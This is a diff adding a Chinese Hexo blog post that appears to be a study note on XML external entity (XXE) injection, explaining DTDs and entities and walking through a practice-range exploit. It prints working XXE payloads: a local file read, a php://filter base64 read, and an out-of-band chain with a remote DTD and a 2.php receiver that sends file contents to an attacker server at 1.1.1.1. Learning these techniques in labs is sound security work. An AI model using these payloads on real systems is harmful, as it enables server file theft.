@@ -1,0 +1,362 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+    <meta name="description" content="XXE介绍XXE即外部实体，从安全角度理解为XML外部实体注入攻击 XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。  文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。 DTD 可被成行地声明于 XML 文">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XXE-实体注入">
+<meta property="og:url" content="http://allblue147.github.io/2019/12/07/XXE-实体注入/index.html">
+<meta property="og:site_name" content="ALL BLUE">
+<meta property="og:description" content="XXE介绍XXE即外部实体，从安全角度理解为XML外部实体注入攻击 XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。  文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。 DTD 可被成行地声明于 XML 文">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007rAy9hgy1g3cwsvo56lj30xq0fvwiv.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007rAy9hgy1g3cz0zbfttj31h00qm758.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007rAy9hgy1g3cz1dhaqqj317w0npwn1.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007rAy9hgy1g3cz1pp4y0j313v05lt9p.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007rAy9hgy1g3cz21z8wsj31h60ra0y4.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007rAy9hgy1g3cz2cygdgj31h30psdfu.jpg">
+<meta property="og:updated_time" content="2019-12-06T17:52:01.946Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="XXE-实体注入">
+<meta name="twitter:description" content="XXE介绍XXE即外部实体，从安全角度理解为XML外部实体注入攻击 XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。  文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。 DTD 可被成行地声明于 XML 文">
+<meta name="twitter:image" content="https://tva1.sinaimg.cn/large/007rAy9hgy1g3cwsvo56lj30xq0fvwiv.jpg">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>XXE-实体注入</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇 " href="/2019/12/07/zhengze/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇 " href="/2019/12/07/XSS2/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://allblue147.github.io/2019/12/07/XXE-实体注入/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://allblue147.github.io/2019/12/07/XXE-实体注入/&text=XXE-实体注入"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://allblue147.github.io/2019/12/07/XXE-实体注入/&title=XXE-实体注入"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://allblue147.github.io/2019/12/07/XXE-实体注入/&is_video=false&description=XXE-实体注入"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=XXE-实体注入&body=Check out this article: http://allblue147.github.io/2019/12/07/XXE-实体注入/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://allblue147.github.io/2019/12/07/XXE-实体注入/&title=XXE-实体注入"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://allblue147.github.io/2019/12/07/XXE-实体注入/&title=XXE-实体注入"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://allblue147.github.io/2019/12/07/XXE-实体注入/&title=XXE-实体注入"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://allblue147.github.io/2019/12/07/XXE-实体注入/&title=XXE-实体注入"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://allblue147.github.io/2019/12/07/XXE-实体注入/&name=XXE-实体注入&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://allblue147.github.io/2019/12/07/XXE-实体注入/&t=XXE-实体注入"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#XXE介绍"><span class="toc-number">1.</span> <span class="toc-text">XXE介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#内部DTD声明"><span class="toc-number">1.0.1.</span> <span class="toc-text">内部DTD声明:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#引用外部DTD声明"><span class="toc-number">1.0.2.</span> <span class="toc-text">引用外部DTD声明:</span></a></li></ol></li></ol><li class="toc-item toc-level-2"><a class="toc-link" href="#DTD实体"><span class="toc-number">2.</span> <span class="toc-text">DTD实体</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-一个外部实体声明"><span class="toc-number">2.1.</span> <span class="toc-text">1. 一个外部实体声明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-一个内部实体声明"><span class="toc-number">2.2.</span> <span class="toc-text">2. 一个内部实体声明</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#simplexml-load-string-函数"><span class="toc-number">3.</span> <span class="toc-text">simplexml_load_string()函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#功能"><span class="toc-number">3.1.</span> <span class="toc-text">功能</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#语法"><span class="toc-number">3.2.</span> <span class="toc-text">语法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#靶场演示"><span class="toc-number">4.</span> <span class="toc-text">靶场演示</span></a></li>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        XXE-实体注入
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">JYP</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-12-06T17:03:10.477Z" itemprop="datePublished">2019-12-07</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/笔记/">笔记</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="XXE介绍"><a href="#XXE介绍" class="headerlink" title="XXE介绍"></a>XXE介绍</h2><p><strong>XXE即外部实体，从安全角度理解为XML外部实体注入攻击</strong></p>
+<p>XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p>
+<p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3cwsvo56lj30xq0fvwiv.jpg" alt></p>
+<p>文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。</p>
+<p>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</p>
+<h4 id="内部DTD声明"><a href="#内部DTD声明" class="headerlink" title="内部DTD声明:"></a>内部DTD声明:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>实例：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">  &lt;!ELEMENT to      (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT from    (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT body    (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">  &lt;to&gt;George&lt;/to&gt;</span><br><span class="line">  &lt;from&gt;John&lt;/from&gt;</span><br><span class="line">  &lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">  &lt;body&gt;Don&apos;t forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure></p>
+<h4 id="引用外部DTD声明"><a href="#引用外部DTD声明" class="headerlink" title="引用外部DTD声明:"></a>引用外部DTD声明:</h4><p><code>&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</code></p>
+<p>或者</p>
+<p><code>&lt;!DOCTYPE 根元素 PUBLIC &quot;public_ID&quot; &quot;文件名&quot;&gt;s</code></p>
+<p><strong>实例</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">&lt;from&gt;John&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don&apos;t forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure></p>
+<p>这是包含 DTD 的 “note.dtd” 文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="DTD实体"><a href="#DTD实体" class="headerlink" title="DTD实体"></a>DTD实体</h2><p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量。</p>
+<p>实体引用是对实体的引用。</p>
+<p>实体可在内部或外部进行声明。</p>
+<h3 id="1-一个外部实体声明"><a href="#1-一个外部实体声明" class="headerlink" title="1. 一个外部实体声明"></a>1. <strong>一个外部实体声明</strong></h3><p>语法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>DTD 例子:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY writer SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>XML 例子:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="2-一个内部实体声明"><a href="#2-一个内部实体声明" class="headerlink" title="2. 一个内部实体声明"></a>2. <strong>一个内部实体声明</strong></h3><p>语法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>DTD 例子:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY writer &quot;Bill Gates&quot;&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>XML 例子:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>实体又分为一般实体和参数实体:</strong></p>
+<ul>
+<li>一般实体的声明语法:</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名 “实体内容“&gt;</span><br></pre></td></tr></table></figure>
+<p>引用实体的方式：&amp;实体名；</p>
+<ul>
+<li>参数实体只能在DTD中使用，参数实体的声明格式： </li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % 实体名 “实体内容“&gt;</span><br></pre></td></tr></table></figure>
+<p>引用实体的方式：%实体名；</p>
+<p><strong>一个实体由三部分构成: 一个和号 (&amp;), 一个实体名称, 以及一个分号 (;)。</strong></p>
+<p><strong>简单XXE攻击payload:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$test=&apos;&lt;!DOCTYPE scan [&lt;!ENTITY test SYSTEM &quot;file:///c:/1.txt&quot;&gt;]&gt;&lt;scan&gt;&amp;test;&lt;/scan&gt;&apos;;</span><br><span class="line">$obj=simplexml_load_string($test,&apos;SimpleXMLElement&apos;,LIBXML_NOENT);</span><br><span class="line">print_r($obj);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>test是一个变量，里面是XML，访问读取了C盘的1.txt然后使用simplexml_load_string将其转换为对象打印出来</strong></p>
+<h2 id="simplexml-load-string-函数"><a href="#simplexml-load-string-函数" class="headerlink" title="simplexml_load_string()函数"></a>simplexml_load_string()函数</h2><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><p>把 XML 字符串载入对象中</p>
+<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">simplexml_load_string(_data,classname,options,ns,is_prefix_ );</span><br></pre></td></tr></table></figure>
+<p>第一个参数是xml语句，SimpleXMLElement是调用了SimpleXMlement这个类，然后LIBXML_NOET是代替实体，然后去调用文件c盘下1.txt。</p>
+<p>在实战中后端语言解析了XML是不会输出读取内容的，我们需要一个类似接受平台的接收器，将XML读取的数据发送到接收平台，然后接受平台储存然后我们在接受平台上分析。先<strong>使用PHP伪协议读取文件：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=c:/1.txt&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>然后<strong>去调用 用来XXE的服务器中的一个xml文档文件：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://1.1.1.1/1.xml&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>而这个XML写的内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> &lt;!ENTITY % all</span><br><span class="line">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://1.1.1.1:8080/2.php?</span><br><span class="line">id=%file;&apos;&gt;&quot;</span><br><span class="line">\&gt;</span><br><span class="line">%all;      //调用实体</span><br></pre></td></tr></table></figure>
+<p><strong>1.XML文档会调用2.php文件并向id通过GET方式传入%file 读取的内容</strong><br>而2.php的内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php file_put_contents(&quot;3.txt&quot;,$_GET[&apos;id&apos;],FILE_APPEND);?&gt;</span><br></pre></td></tr></table></figure>
+<p>2.php被调用后会将id传进来的参数即%file的内容写入到3.php中，我们就可以通过访问3.php得到我们想读取的内容；</p>
+<h2 id="靶场演示"><a href="#靶场演示" class="headerlink" title="靶场演示"></a>靶场演示</h2><p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3cz0zbfttj31h00qm758.jpg" alt><br>进入XXE靶场（外部实体注入），我们发现了<strong>simplexml_load_string()函数</strong>，这里很可能有XXE漏洞，我们看了下附件代码件：<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3cz1dhaqqj317w0npwn1.jpg" alt><br>发现这里通过$poststr接收数据并将数据直接放入到simplexml_load_string()转换为对象，那这里是可以进行XXE的；</p>
+<p>我们先构造出XXE的poc代码：<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3cz1pp4y0j313v05lt9p.jpg" alt><br>第三行是通过php伪协议去读取<strong>被攻击服务器</strong>下的<strong>flag.php</strong>文件内容（base64编码，方便数据传输）</p>
+<p>第四行是通过外部实体声明加载<strong>攻击者服务器</strong>的<strong>1.xml</strong>文件</p>
+<p>第五行调用外部实体remote</p>
+<p>第六行调用外部实体send</p>
+<p><strong>1.xml</strong>文件内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all</span><br><span class="line">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://1.1.1.1:8080/xxe/2.php?id=%file;&apos;&gt;&quot;</span><br><span class="line"> \&gt;</span><br><span class="line">%all;</span><br></pre></td></tr></table></figure>
+<p><strong>调用2.php并传入参数</strong></p>
+<p><strong>2.php内容如下：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php file_put_contents(&quot;3.txt&quot;,$_GET[&apos;id&apos;],FILE_APPEND);?&gt;</span><br></pre></td></tr></table></figure>
+<p>将传参的内容，即读取到的文件写入放到3.txt中，成功读取文件</p>
+<p>抓包，通过POST方式上传<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3cz21z8wsj31h60ra0y4.jpg" alt><br>访问攻击者（即自己）的服务器，看看3.txt是否收到读取的文件<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3cz2cygdgj31h30psdfu.jpg" alt><br>成功读取到文件，因为之前对其进行base64编码，所以进行base64解码即可得到原来的内容！</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#XXE介绍"><span class="toc-number">1.</span> <span class="toc-text">XXE介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#内部DTD声明"><span class="toc-number">1.0.1.</span> <span class="toc-text">内部DTD声明:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#引用外部DTD声明"><span class="toc-number">1.0.2.</span> <span class="toc-text">引用外部DTD声明:</span></a></li></ol></li></ol><li class="toc-item toc-level-2"><a class="toc-link" href="#DTD实体"><span class="toc-number">2.</span> <span class="toc-text">DTD实体</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-一个外部实体声明"><span class="toc-number">2.1.</span> <span class="toc-text">1. 一个外部实体声明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-一个内部实体声明"><span class="toc-number">2.2.</span> <span class="toc-text">2. 一个内部实体声明</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#simplexml-load-string-函数"><span class="toc-number">3.</span> <span class="toc-text">simplexml_load_string()函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#功能"><span class="toc-number">3.1.</span> <span class="toc-text">功能</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#语法"><span class="toc-number">3.2.</span> <span class="toc-text">语法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#靶场演示"><span class="toc-number">4.</span> <span class="toc-text">靶场演示</span></a></li>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://allblue147.github.io/2019/12/07/XXE-实体注入/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://allblue147.github.io/2019/12/07/XXE-实体注入/&text=XXE-实体注入"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://allblue147.github.io/2019/12/07/XXE-实体注入/&title=XXE-实体注入"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://allblue147.github.io/2019/12/07/XXE-实体注入/&is_video=false&description=XXE-实体注入"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=XXE-实体注入&body=Check out this article: http://allblue147.github.io/2019/12/07/XXE-实体注入/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://allblue147.github.io/2019/12/07/XXE-实体注入/&title=XXE-实体注入"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://allblue147.github.io/2019/12/07/XXE-实体注入/&title=XXE-实体注入"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://allblue147.github.io/2019/12/07/XXE-实体注入/&title=XXE-实体注入"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://allblue147.github.io/2019/12/07/XXE-实体注入/&title=XXE-实体注入"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://allblue147.github.io/2019/12/07/XXE-实体注入/&name=XXE-实体注入&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://allblue147.github.io/2019/12/07/XXE-实体注入/&t=XXE-实体注入"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2021
+    JYP
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'">
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
